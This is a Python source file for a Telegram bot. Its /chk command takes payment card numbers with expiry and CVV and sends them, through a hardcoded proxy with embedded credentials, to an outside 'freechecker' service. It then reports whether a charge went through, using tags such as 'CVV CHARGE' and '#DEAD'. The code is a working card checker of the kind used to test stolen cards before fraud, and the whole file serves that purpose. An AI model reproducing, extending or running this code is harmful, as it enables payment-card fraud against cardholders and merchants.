from pyrogram import Client, filters
import requests
from EQUROBOT import app


# Command handler for /chk
@app.on_message(filters.command("chk"))
async def check_cc(client, message):
    # Extract the card details from the message
    try:
        card_details = message.text.split()[1]
    except IndexError:
        await message.reply_text("Please provide card details in the format: /chk cc|mm|yyyy|cvv")
        return
    
    # API endpoint and parameters
    url = "https://freechecker.hrk.dev/checker"
    params = {
        'cc': card_details,
        'proxy': "50.3.137.177:12345:tickets:proxyon145"  # Replace with your proxy if needed
    }
    
    # Make the API request
    response = requests.get(url, params=params)
    response_json = response.json()
    
    # Process the response
    payment_info = response_json.get('payment', {})
    status = payment_info.get('status', 'failed')
    amount = payment_info.get('amount', 'UNKNOWN')
    currency = payment_info.get('currency', 'UNKNOWN')
    message_info = payment_info.get('message', {})
    failed_reason_message = message_info.get('failed_reason_message', 'UNKNOWN')
    intent = message_info.get('intent', 'UNKNOWN')
    text = message_info.get('text', 'UNKNOWN')
    
    if status == 'succeeded':
        reply_text = (
            "┏━━━━━━━⍟\n"
            f"┃#CHARGE {amount} {currency} ✅\n"
            "┗━━━━━━━━━━━⊛\n"
            f"CARD:- {card_details}\n"
            f"RESPONSE:- CVV CHARGE ✅\n"
            f"MSG:- PAYMENT SUCCESSFUL ✅\n"
            f"INVOICE:- {payment_info.get('invoice', 'UNKNOWN')}\n"
            f"INTENT:- {intent}"
        )
    else:
        reply_text = (
            "┏━━━━━━━⍟\n"
            "┃#DEAD ❌\n"
            "┗━━━━━━━━━━━⊛\n"
            f"CARD:- {card_details}\n"
            f"RESPONSE:- CVV DECLINE ❌\n"
            f"MSG:- {failed_reason_message} ❌\n"
            f"INTENT:- {intent}\n"
            f"DETAILS:- {text}"
        )
    
    # Send the response to the user
    await message.reply_text(reply_text)
